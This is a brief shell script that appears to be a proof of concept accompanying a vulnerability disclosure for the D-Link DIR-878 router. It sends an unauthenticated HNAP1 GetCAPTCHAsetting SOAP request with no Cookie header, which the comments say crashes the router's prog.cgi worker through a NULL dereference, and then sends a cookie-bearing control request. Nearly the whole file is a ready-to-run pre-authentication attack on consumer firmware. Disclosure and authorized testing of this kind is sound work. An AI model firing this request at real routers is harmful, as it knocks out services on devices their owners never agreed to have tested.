#!/bin/sh
# Reproduction script for: DIR-878 GetCAPTCHAsetting missing Cookie -> NULL dereference (pre-auth)
# Derived from the request recorded in README.md. Non-destructive: the FastCGI worker is
# restarted automatically and nothing is written to configuration or flash.
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
BODY='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetCAPTCHAsetting xmlns="http://purenetworks.com/HNAP1/"></GetCAPTCHAsetting></soap:Body></soap:Envelope>'
echo "[*] Attack: no Cookie header - expect 500 (prog.cgi crash)"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/" \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H 'Content-Type: text/xml' --data-binary "$BODY"
echo "[*] Control: any Cookie present - expect 200 OK"
curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/" \
  -H 'SOAPAction: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H 'Cookie: uid=ab12' -H 'Content-Type: text/xml' --data-binary "$BODY"
